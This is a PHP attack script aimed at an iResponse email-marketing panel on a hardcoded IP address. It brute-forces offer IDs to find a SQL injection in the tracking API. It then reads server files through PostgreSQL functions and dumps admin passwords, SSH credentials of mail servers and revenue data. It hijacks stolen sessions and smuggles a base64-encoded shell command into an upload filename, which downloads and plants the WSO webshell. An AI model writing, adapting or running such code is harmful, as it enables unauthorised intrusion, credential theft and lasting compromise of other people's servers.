<?php

class ConfigExtractor
{
    private $ip;
    private $url;
    private $api;
    private $proxy;

    public function __construct($ip, $proxy = null)
    {
        $this->ip = $ip;
        $this->url = "http://$ip/";
        $this->api = "http://$ip/api.json";
        $this->proxy = $proxy;
    }

    public function makePostRequest($offer_id, $payload)
    {
        $form_data = [
            'controller' => 'Tracking',
            'action' => 'getLink',
            'parameters[type]' => $payload,
            'parameters[process-id]' => '0',
            'parameters[process-type]' => 'md',
            'parameters[user-id]' => '1',
            'parameters[vmta-id]' => '104',
            'parameters[list-id]' => '0',
            'parameters[client-id]' => '0',
            'parameters[offer-id]' => strval($offer_id),
            'parameters[ip]' => '173.249.49.113'
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $this->api);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $form_data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        if ($this->proxy) {
            curl_setopt($ch, CURLOPT_PROXY, $this->proxy);
        }

        $response = curl_exec($ch);
        curl_close($ch);

        if ($response === false) {
            return [];
        }
        $data = json_decode($response, true);
        //print_r($data);
        return $data['data'] ?? [];
    }

    public function getPath()
    {
        $headers = [
            'Accept: application/json, text/plain, */*',
            'Cookie: iresponse_session=_cookie',
            'User-Agent: axios/1.6.7',
            'Accept-Encoding: gzip, compress, deflate, br',
            'Host: 104.128.239.146:8181',
            'Connection: close'
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $this->url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

        if ($this->proxy) {
            curl_setopt($ch, CURLOPT_PROXY, $this->proxy);
        }

        $response = curl_exec($ch);
        curl_close($ch);

        if ($response === false) {
            return null;
        }

        preg_match_all("/(\/[a-zA-Z0-9._\/-]+\.php)/", $response, $matches);
        if (!empty($matches[0])) {
            return implode('/', array_slice(explode('/', $matches[0][0]), 0, 3)) . '/';
        }

        return null;
    }

    public function extractPathAndPort($config_content)
    {
        $path_pattern = '/^\s*DocumentRoot\s+"?([^"\s]+)"?/m';
        $port_pattern = '/^\s*Listen\s+(\d+)/m';

        preg_match($path_pattern, $config_content, $path_match);
        preg_match($port_pattern, $config_content, $port_match);

        $app_path = $path_match[1] ?? null;
        $port = $port_match[1] ?? null;

        return [$app_path, $port];
    }

    public function getDocumentRoot($offer_id, $config_dir)
    {
        $paths_payload = "nq['' union all select 'aa',(select STRING_AGG(pg_ls_dir,',') from pg_ls_dir('$config_dir'))]";
        $response = $this->makePostRequest($offer_id, $paths_payload);

        if (isset($response['link'])) {
            $paths = explode(",", $response['link']);
            foreach ($paths as $path) {
                $config_payload = "nq['' union all select 'aa',(select pg_read_file('$config_dir$path'))]";
                $response = $this->makePostRequest($offer_id, $config_payload);

                if (isset($response['link'])) {
                    [$path, $port] = $this->extractPathAndPort($response['link']);
                    list($app_ip, $app_port) = explode(":", $this->ip) + [null, null];

                    if ($path && strpos($path, "public") !== false && $port == $app_port) {
                        return str_replace('/public/', '/', $path);
                    }
                }
            }
        }

        return null;
    }
    public function get_total_income($offer_id)
    {
        $payload = "nq['' union all select 'aa',(select STRING_AGG(payout::text,',') from actions.leads)]";

        // Make POST request
        $response = $this->makePostRequest($offer_id, $payload);

        // Check if 'link' exists in the response
        if (isset($response['link'])) {
            // Split the 'link' string by commas into an array
            $payouts = explode(",", $response['link']);

            // Convert each payout to a float
            $payouts = array_map('floatval', $payouts);

            // Return the sum of the payouts
            return array_sum($payouts);
        }

        return 0;  // Return 0 if 'link' is not in the response
    }
    public function getMonthlyEarning($session)
    {
        $headers = [
            'Accept: application/json, text/javascript, */*; q=0.01',
            'Accept-Language: fr-FR,fr',
            'Connection: keep-alive',
            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            "Cookie: iresponse_session=$session",
            'Origin: http://212.64.215.211',
            'Referer: http://212.64.215.211/dashboard.html',
            'Sec-GPC: 1',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
            'X-Requested-With: XMLHttpRequest'
        ];

        $data = [
            'controller' => 'Dashboard',
            'action' => 'getMonthlyEarningsChart',
            'parameters[months][]' => [
                'January',
                'February',
                'March',
                'April',
                'May',
                'June',
                'July',
                'August',
                'September',
                'October',
                'November',
                'December'
            ]
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $this->api);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

        $response = curl_exec($ch);
        curl_close($ch);

        if ($response === false) {
            return null;
        }

        return json_decode($response, true);
    }

    public function upload($path, $session)
    {
        $command = base64_encode("wget -P {$path}public/ https://raw.githubusercontent.com/mIcHyAmRaNe/wso-webshell/refs/heads/master/wso.php");

        $headers = array(
            'Connection: keep-alive',
            "Cookie: iresponse_session={$session}; 026c6d5cd058af5b706c0d86f9ed103fkey=b9cbd8dc13f19f9e7eb854f472bfa274",
            'Origin: ' . $this->ip,
            'Referer: ' . $this->ip . '/data-lists.html',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
            'accept: application/json, text/javascript, */*; q=0.01',
            'accept-language: en-US,en;q=0.9',
            'content-type: multipart/form-data; boundary=----WebKitFormBoundary6PVaBSlFa8ZS1ndL',
            'x-requested-with: XMLHttpRequest',
        );

        $data = "------WebKitFormBoundary6PVaBSlFa8ZS1ndL\r\nContent-Disposition: form-data; name=\"files[]\"; filename=\"s.txt && base64 -d <<< $command | sh\"\r\nContent-Type: text/plain\r\n\r\na@gmail.com\r\n------WebKitFormBoundary6PVaBSlFa8ZS1ndL\r\nContent-Disposition: form-data; name=\"data-provider-id\"\r\n\r\n1\r\n------WebKitFormBoundary6PVaBSlFa8ZS1ndL\r\nContent-Disposition: form-data; name=\"list-name\"\r\n\r\nerty56u\r\n------WebKitFormBoundary6PVaBSlFa8ZS1ndL\r\nContent-Disposition: form-data; name=\"emails-type\"\r\n\r\nfresh\r\n------WebKitFormBoundary6PVaBSlFa8ZS1ndL\r\nContent-Disposition: form-data; name=\"isp\"\r\n\r\n1\r\n------WebKitFormBoundary6PVaBSlFa8ZS1ndL\r\nContent-Disposition: form-data; name=\"country\"\r\n\r\nUS\r\n------WebKitFormBoundary6PVaBSlFa8ZS1ndL\r\nContent-Disposition: form-data; name=\"verticals\"\r\n\r\nnull\r\n------WebKitFormBoundary6PVaBSlFa8ZS1ndL\r\nContent-Disposition: form-data; name=\"list-old-id\"\r\n\r\n\r\n------WebKitFormBoundary6PVaBSlFa8ZS1ndL\r\nContent-Disposition: form-data; name=\"file-type\"\r\n\r\nemail-by-line\r\n------WebKitFormBoundary6PVaBSlFa8ZS1ndL\r\nContent-Disposition: form-data; name=\"list-deviding-value\"\r\n\r\n0\r\n------WebKitFormBoundary6PVaBSlFa8ZS1ndL\r\nContent-Disposition: form-data; name=\"duplicate-value\"\r\n\r\n1\r\n------WebKitFormBoundary6PVaBSlFa8ZS1ndL\r\nContent-Disposition: form-data; name=\"encrypt-emails\"\r\n\r\ndisabled\r\n------WebKitFormBoundary6PVaBSlFa8ZS1ndL\r\nContent-Disposition: form-data; name=\"allow-duplicates\"\r\n\r\ndisabled\r\n------WebKitFormBoundary6PVaBSlFa8ZS1ndL\r\nContent-Disposition: form-data; name=\"filter-data\"\r\n\r\ndisabled\r\n------WebKitFormBoundary6PVaBSlFa8ZS1ndL--\r\n";

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $this->url . '/data-lists/save.html');
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        if ($this->proxy) {
            curl_setopt($ch, CURLOPT_PROXY, $this->proxy);
        }

        $response = curl_exec($ch);
        print_r($response);
        curl_close($ch);

        return $response;
    }
}

function testBug($url)
{
    $extractor = new ConfigExtractor($url);
    $version_payload = "nq['' union all select 'aa',(select version())]";

    for ($i = 1; $i < 1000000; $i += 10) {
        $response = $extractor->makePostRequest($i, $version_payload);
        if (isset($response['link'])) {
            return $i;
        } else {
            echo "Offer ID $i not found\n";
        }
    }

    return 0;
}

$url = "162.55.84.187";
$extractor = new ConfigExtractor($url);

// Example function to demonstrate usage:
function main()
{
    global $extractor, $url;
    $offer_id = testBug($url);
    if ($offer_id > 0) {
        $income = $extractor->get_total_income($offer_id);
        echo "total income :" . $income . PHP_EOL;

        $path = $extractor->getDocumentRoot($offer_id, "/etc/httpd/conf.d/");

        if ($path == null)
            $path = $extractor->getDocumentRoot($offer_id, "/etc/httpd/conf.d/");
        echo $path;

        if ($path) {
            $path = trim($path, "\"");

            $payloads = [
                "nq['' union all select 'aa',(select STRING_AGG(pg_ls_dir,',') from pg_ls_dir('{$path}storage/sessions'))]",
                "nq['' union all select 'aa',(select pg_read_file('{$path}iResponse/datasources/clients.json'))]",
                "nq['' union all select 'aa',(select STRING_AGG(SUM(payout::text,',') from actions.leads)]",
                "nq['' union all select 'aa',(select STRING_AGG(CONCAT(main_ip,':',ssh_port::text,'|',old_ssh_port::text,'|',ssh_username,'|',ssh_password,'|',old_ssh_password),'\n') from admin.mta_servers)]",
                "nq['' union all select 'aa',(select STRING_AGG(CONCAT(id,'|',email,'|',password),'\n') from admin.users)]"
            ];

            $working_session = "";
            foreach ($payloads as $payload) {
                $response = $extractor->makePostRequest($offer_id, $payload);
                if (isset($response['link'])) {
                    echo $response['link'] . "\n";
                    if (strpos($payload, 'session') !== false) {
                        $sessions_id = explode(",", $response['link']);
                        foreach ($sessions_id as $session_id) {
                            $session = explode("_", $session_id)[1];
                            $monthly_earnings = $extractor->getMonthlyEarning($session);
                            if ($monthly_earnings && $monthly_earnings['status'] != 401) {
                                echo "Monthly earnings for $url: " . json_encode($monthly_earnings) . "\n";
                                $working_session = $session;
                                break;
                            }
                        }
                    }
                }
            }
            if ($working_session) {
                echo $working_session;
                $extractor->upload($path, $working_session);
            }
        }

    }
}

main();

?>
